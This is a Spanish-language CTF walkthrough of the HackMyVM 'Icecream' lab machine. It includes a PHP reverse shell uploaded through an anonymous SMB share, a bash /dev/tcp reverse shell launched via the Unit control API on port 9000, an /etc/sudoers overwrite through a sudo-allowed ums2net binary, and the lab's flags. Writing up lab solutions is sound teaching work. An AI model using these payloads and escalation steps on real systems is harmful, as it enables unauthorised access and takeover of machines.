---
icon: flag
---

# Icecream HackMyVM (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-14 03:29 EDT
Nmap scan report for 192.168.5.57
Host is up (0.0011s latency).

PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 68:94:ca:2f:f7:62:45:56:a4:67:84:59:1b:fe:e9:bc (ECDSA)
|_  256 3b:79:1a:21:81:af:75:c2:c1:2e:4e:f5:a3:9c:c9:e3 (ED25519)
80/tcp   open  http        nginx 1.22.1
|_http-server-header: nginx/1.22.1
|_http-title: 403 Forbidden
139/tcp  open  netbios-ssn Samba smbd 4
445/tcp  open  netbios-ssn Samba smbd 4
9000/tcp open  cslistener?
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Server: Unit/1.33.0
|     Date: Mon, 14 Jul 2025 07:29:15 GMT
|     Content-Type: application/json
|     Content-Length: 40
|     Connection: close
|     "error": "Value doesn't exist."
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Unit/1.33.0
|     Date: Mon, 14 Jul 2025 07:29:14 GMT
|     Content-Type: application/json
|     Content-Length: 1042
|     Connection: close
|     "certificates": {},
|     "js_modules": {},
|     "config": {
|     "listeners": {},
|     "routes": [],
|     "applications": {}
|     "status": {
|     "modules": {
|     "python": {
|     "version": "3.11.2",
|     "lib": "/usr/lib/unit/modules/python3.11.unit.so"
|     "php": {
|     "version": "8.2.18",
|     "lib": "/usr/lib/unit/modules/php.unit.so"
|     "perl": {
|     "version": "5.36.0",
|     "lib": "/usr/lib/unit/modules/perl.unit.so"
|     "ruby": {
|     "version": "3.1.2",
|     "lib": "/usr/lib/unit/modules/ruby.unit.so"
|     "java": {
|     "version": "17.0.11",
|     "lib": "/usr/lib/unit/modules/java17.unit.so"
|     "wasm": {
|     "version": "0.1",
|     "lib": "/usr/lib/unit/modules/wasm.unit.so"
|   HTTPOptions: 
|     HTTP/1.1 405 Method Not Allowed
|     Server: Unit/1.33.0
|     Date: Mon, 14 Jul 2025 07:29:14 GMT
|     Content-Type: application/json
|     Content-Length: 35
|     Connection: close
|_    "error": "Invalid method."
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at 
https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port9000-TCP:V=7.95%I=7%D=7/14%Time=6874B1CA%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,4A8,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Unit/1\.33\.0\r\nDat
SF:e:\x20Mon,\x2014\x20Jul\x202025\x2007:29:14\x20GMT\r\nContent-Type:\x20
SF:application/json\r\nContent-Length:\x201042\r\nConnection:\x20close\r\n
SF:\r\n{\r\n\t\"certificates\":\x20{},\r\n\t\"js_modules\":\x20{},\r\n\t\"
SF:config\":\x20{\r\n\t\t\"listeners\":\x20{},\r\n\t\t\"routes\":\x20[\],
SF:\r\n\t\t\"applications\":\x20{}\r\n\t},\r\n\r\n\t\"status\":\x20{\r\n\t
SF:\t\"modules\":\x20{\r\n\t\t\t\"python\":\x20{\r\n\t\t\t\t\"version\":\x
SF:20\"3\.11\.2\",\r\n\t\t\t\t\"lib\":\x20\"/usr/lib/unit/modules/python3\
SF:.11\.unit\.so\"\r\n\t\t\t},\r\n\r\n\t\t\t\"php\":\x20{\r\n\t\t\t\t\"ver
SF:sion\":\x20\"8\.2\.18\",\r\n\t\t\t\t\"lib\":\x20\"/usr/lib/unit/modules
SF:/php\.unit\.so\"\r\n\t\t\t},\r\n\r\n\t\t\t\"perl\":\x20{\r\n\t\t\t\t\"v
SF:ersion\":\x20\"5\.36\.0\",\r\n\t\t\t\t\"lib\":\x20\"/usr/lib/unit/modul
SF:es/perl\.unit\.so\"\r\n\t\t\t},\r\n\r\n\t\t\t\"ruby\":\x20{\r\n\t\t\t\t
SF:\"version\":\x20\"3\.1\.2\",\r\n\t\t\t\t\"lib\":\x20\"/usr/lib/unit/mod
SF:ules/ruby\.unit\.so\"\r\n\t\t\t},\r\n\r\n\t\t\t\"java\":\x20{\r\n\t\t\t
SF:\t\"version\":\x20\"17\.0\.11\",\r\n\t\t\t\t\"lib\":\x20\"/usr/lib/unit
SF:/modules/java17\.unit\.so\"\r\n\t\t\t},\r\n\r\n\t\t\t\"wasm\":\x20{\r\n
SF:\t\t\t\t\"version\":\x20\"0\.1\",\r\n\t\t\t\t\"lib\":\x20\"/usr/lib/uni
SF:t/modules/wasm\.unit\.so\"\r\n\t\t\t},\r\n\r\n\t\t")%r(HTTPOptions,C7,"
SF:HTTP/1\.1\x20405\x20Method\x20Not\x20Allowed\r\nServer:\x20Unit/1\.33\.
SF:0\r\nDate:\x20Mon,\x2014\x20Jul\x202025\x2007:29:14\x20GMT\r\nContent-T
SF:ype:\x20application/json\r\nContent-Length:\x2035\r\nConnection:\x20clo
SF:se\r\n\r\n{\r\n\t\"error\":\x20\"Invalid\x20method\.\"\r\n}\r\n")%r(Fou
SF:rOhFourRequest,C3,"HTTP/1\.1\x20404\x20Not\x20Found\r\nServer:\x20Unit/
SF:1\.33\.0\r\nDate:\x20Mon,\x2014\x20Jul\x202025\x2007:29:15\x20GMT\r\nCo
SF:ntent-Type:\x20application/json\r\nContent-Length:\x2040\r\nConnection:
SF:\x20close\r\n\r\n{\r\n\t\"error\":\x20\"Value\x20doesn't\x20exist\.\"\r
SF:\n}\r\n");
MAC Address: 08:00:27:A5:90:78 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_nbstat: NetBIOS name: ICECREAM, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-time: 
|   date: 2025-07-14T07:29:15
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.36 seconds
```

Veremos varias cosas interesantes pero entre ellas el puerto `9000` y el servidor `SMB`, pero de momento vamos a centrarnos en el servidor `SMB` a ver si nos podemos conectar de forma anonima.

## SMB

```shell
smbclient -L //<IP>/ -N
```

Info:

```
Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        icecream        Disk      tmp Folder
        IPC$            IPC       IPC Service (Samba 4.17.12-Debian)
        nobody          Disk      Home Directories
```

Veremos que podemos listarlo de forma anonima, por lo que vamos a conectarnos al recurso compartido mas interesante llamado `icecream` que es el que no viene por defecto.

```shell
smbclient //<IP>/icecream -N
```

Info:

```
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Jul 14 03:33:01 2025
  ..                                  D        0  Sun Oct  6 06:06:38 2024
  .font-unix                         DH        0  Mon Jul 14 03:27:59 2025
  .XIM-unix                          DH        0  Mon Jul 14 03:27:59 2025
  systemd-private-ede18285066f40d7aa42f4d8f26598b0-systemd-timesyncd.service-EgZPjc      D        0  Mon Jul 14 03:27:59 2025
  .ICE-unix                          DH        0  Mon Jul 14 03:27:59 2025
  systemd-private-ede18285066f40d7aa42f4d8f26598b0-systemd-logind.service-a1RUQX      D        0  Mon Jul 14 03:28:00 2025
  .X11-unix                          DH        0  Mon Jul 14 03:27:59 2025

                19480400 blocks of size 1024. 16159792 blocks available
```

Veremos que ha funcionado, si listamos no vemos nada interesante y si nos metemos en el puerto `80` veremos un `403 Forbbiden` por lo que no podremos hacer gran cosa, vamos a probar a subir un archivo al servidor `SMB` e intentar verlo desde el puerto `80` a ver si se comparte los archivos, por lo que vamos hacer lo siguiente.

> test.txt

```
Texto de prueba
```

Ahora desde el servidor `SMB` hacemos esto.

```shell
put test.txt
```

Y con el `curl` vamos a ver si se esta compartiendo dicho archivo.

```shell
curl http://<IP>/test.txt
```

Info:

```
Texto de prueba
```

Veremos que esta funcionando, por lo que vamos a crear un archivo `PHP` para generarnos una `reverse shell` de esta forma.

## Escalate user www-data

> shell.php

```php
<?php
$sock=fsockopen("<IP>",<PORT>);$proc=proc_open("sh", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
```

Ahora realizaremos el mismo proceso que antes, vamos a subir dicho archivo a `SMB` de esta forma:

```shell
put shell.php
```

Una vez subido desde el `host` vamos a ponernos a la escucha:

```shell
nc -lvnp <PORT>
```

Ahora vamos a visitar dicho archivo desde el navegador de esta forma:

```
URL = htpp://<IP>/shell.php
```

Ahora si volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.5.50] from (UNKNOWN) [192.168.5.57] 54584
whoami
www-data
```

Veremos que ha funcionado, por lo que vamos a sanitizar la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

## Escalate user ice

Despues de buscar un rato, si vemos los procesos que estan pasando por dentro con un script llamado `pspy64` esta en `GitHub` podremos ver los procesos de la maquina victima de `linux`, por lo que nos lo pasaremos de esta forma:

> host

```shell
python3 -m http.server 80
```

> victima

```shell
cd /tmp
wget http://<IP>/pspy64
```

Una vez que nos lo hayamos pasado lo ejecutaremos:

```shell
chmod +x pspy64
./pspy64
```

Info:

```
pspy - version: v1.2.1 - Commit SHA: f9e6a1590a4312b9faa093d8dc84e19567977a6d


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2025/07/14 09:51:36 CMD: UID=33    PID=817    | ./pspy64 
2025/07/14 09:51:36 CMD: UID=0     PID=816    | 
2025/07/14 09:51:36 CMD: UID=0     PID=800    | 
2025/07/14 09:51:36 CMD: UID=33    PID=768    | bash 
2025/07/14 09:51:36 CMD: UID=33    PID=767    | sh -c bash 
2025/07/14 09:51:36 CMD: UID=33    PID=766    | script /dev/null -c bash 
2025/07/14 09:51:36 CMD: UID=33    PID=764    | sh 
2025/07/14 09:51:36 CMD: UID=33    PID=763    | sh -c sh 
2025/07/14 09:51:36 CMD: UID=0     PID=761    | 
2025/07/14 09:51:36 CMD: UID=0     PID=757    | 
2025/07/14 09:51:36 CMD: UID=0     PID=732    | 
2025/07/14 09:51:36 CMD: UID=0     PID=661    | /usr/sbin/smbd --foreground --no-process-group 
2025/07/14 09:51:36 CMD: UID=0     PID=586    | /usr/sbin/smbd --foreground --no-process-group 
2025/07/14 09:51:36 CMD: UID=0     PID=585    | /usr/sbin/smbd --foreground --no-process-group 
2025/07/14 09:51:36 CMD: UID=0     PID=578    | /usr/sbin/smbd --foreground --no-process-group 
2025/07/14 09:51:36 CMD: UID=0     PID=541    | /usr/sbin/nmbd --foreground --no-process-group 
2025/07/14 09:51:36 CMD: UID=33    PID=520    | php-fpm: pool www                                                             
2025/07/14 09:51:36 CMD: UID=33    PID=518    | php-fpm: pool www                                                             
2025/07/14 09:51:36 CMD: UID=0     PID=516    | sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups 
2025/07/14 09:51:36 CMD: UID=999   PID=507    | unit: router    
2025/07/14 09:51:36 CMD: UID=999   PID=506    | unit: controller 
2025/07/14 09:51:36 CMD: UID=1000  PID=505    | unit: router                                      
2025/07/14 09:51:36 CMD: UID=1000  PID=504    | unit: controller                                  
2025/07/14 09:51:36 CMD: UID=33    PID=502    | nginx: worker process                            
2025/07/14 09:51:36 CMD: UID=0     PID=500    | nginx: master process /usr/sbin/nginx -g daemon on; master_process on; 
2025/07/14 09:51:36 CMD: UID=0     PID=491    | unit: main v1.33.0 [/usr/sbin/unitd] 
2025/07/14 09:51:36 CMD: UID=0     PID=490    | /sbin/agetty -o -p -- \u --noclear - linux 
2025/07/14 09:51:36 CMD: UID=0     PID=481    | php-fpm: master process (/etc/php/8.2/fpm/php-fpm.conf)                       
2025/07/14 09:51:36 CMD: UID=0     PID=422    | unit: main v1.33.0 [/usr/sbin/unitd --control 0.0.0.0:9000 --user ice] 
2025/07/14 09:51:36 CMD: UID=0     PID=401    | /sbin/wpa_supplicant -u -s -O DIR=/run/wpa_supplicant GROUP=netdev 
2025/07/14 09:51:36 CMD: UID=0     PID=391    | dhclient -4 -v -i -pf /run/dhclient.enp0s3.pid -lf /var/lib/dhcp/dhclient.enp0s3.leases -I -df /var/lib/dhcp/dhclient6.enp0s3.leases enp0s3                                                                                                                               
2025/07/14 09:51:36 CMD: UID=0     PID=350    | /lib/systemd/systemd-logind 
2025/07/14 09:51:36 CMD: UID=100   PID=348    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only 
2025/07/14 09:51:36 CMD: UID=0     PID=346    | /usr/sbin/cron -f 
2025/07/14 09:51:36 CMD: UID=0     PID=331    | 
2025/07/14 09:51:36 CMD: UID=997   PID=294    | /lib/systemd/systemd-timesyncd 
2025/07/14 09:51:36 CMD: UID=0     PID=291    | 
2025/07/14 09:51:36 CMD: UID=0     PID=236    | /lib/systemd/systemd-udevd 
2025/07/14 09:51:36 CMD: UID=0     PID=211    | /lib/systemd/systemd-journald 
2025/07/14 09:51:36 CMD: UID=0     PID=172    | 
2025/07/14 09:51:36 CMD: UID=0     PID=171    | 
^CExiting program... (interrupt)
```

Por lo que vemos en esta linea:

```
/usr/sbin/unitd --control 0.0.0.0:9000 --user ice
```

Se esta ejecutando le binario `unitd` en el puerto `9000` bajo el usuario `ice` por lo que si conseguimos realizar una `reverse shell` en dicho puerto podremos obtener acceso como dicho usuario.

Si entramos en el puerto `9000` veremos cosas en `JSON` por lo que nos podremos montar una configuracion en `JSON` para subirla por `POST` con `curl` y que obtenga la `reverse shell` que tenemos en `/tmp`.

> rev.sh

```bash
#!/bin/bash

bash -c 'bash -i >& /dev/tcp/<IP>/<PORT> 0>&1'
```

Lo guardamos en `/tmp` el archivo, le damos permisos de ejecuccion:

```shell
chmod +x rev.sh
```

Ahora desde nuestro `host` vamos a crear el archivo de configuracion que nos va a proporcionar la `shell`.

> config.json

```json
{
  "listeners": {
    "*:8080": {
      "pass": "applications/myapp"
    }
  },
  "applications": {
    "myapp": {
      "type": "external",
      "executable": "/tmp/rev.sh"
    }
  }
}
```

Ahora nos pondremos a la escucha antes de subirlo.

```shell
nc -lvnp <PORT>
```

Vamos a subir el archivo de configuracion de esta forma:

```shell
curl -X PUT -d @config.json http://<IP_VICTIM>:9000/config
```

Una vez echo esto si volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7755 ...
connect to [192.168.5.50] from (UNKNOWN) [192.168.5.57] 55172
ice@icecream:~$ whoami
ice
```

Veremos que ha funcioando, por lo que sanitizaremos la `shell`.

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

Por lo que leeremos la `flag` del usuario.

> user.txt

```
HMVaneraseroflove
```

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for ice on icecream:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User ice may run the following commands on icecream:
    (ALL) NOPASSWD: /usr/sbin/ums2net
```

Vemos que podemos ejecutar el binario `ums2net` como el usuario `root`, por lo que haremos lo siguiente.

Con esto podremos escribir archivos en el sistema como `root`, por lo que vamos añadirnos en el archivo `sudoers`.

```shell
cd /tmp
echo "ice ALL=(ALL) NOPASSWD: ALL" > sudoers
cat > pwned.conf << EOF
7766 of=/etc/sudoers
EOF
sudo /usr/sbin/ums2net -c pwned.conf -d
```

Con esto nos quedaremos a la escucha, en otra terminal dentro de la maquina victima, aprovechemos que tenemos la `shell` del usuario `www-data` y vamos a volcar dicho archivo `sudoers` nuestro modificado mediante el puerto que tenemos escuchando como `root` por lo que va a sobreescribirlo con lo nuestro.

```shell
cd /tmp
nc <IP_VICTIM> 7766 < sudoers
```

Una vez echo esto, le daremos a `Ctrl+C` para dejarlo ya, ya que con haberlo ejecutado ya lo habremos volcado, si nos volvemos a donde tenemos la escucha de `root` del usuario `ice` veremos esto:

```
ums2net[1102]: Totally write 28 bytes to /etc/sudoers
```

Con esto vemos que se ha pasado el archivo de forma correcta, por lo que si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for ice on icecream:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User ice may run the following commands on icecream:
    (ALL) NOPASSWD: ALL
    (ALL) NOPASSWD: /usr/sbin/ums2net
```

Vemos que ha funcionado por lo que haremos lo siguiente para ser `root`.

```shell
sudo su
```

Info:

```
/etc/sudoers:2:11: error de sintaxis
 with the 'visudo' command as root.
          ^~~~~~~~
root@icecream:/tmp# whoami
root
```

Con esto ya seremos el usuario `root`, por lo que leeremos la `flag` de `root`.

> root.txt

```
HMViminvisible
```
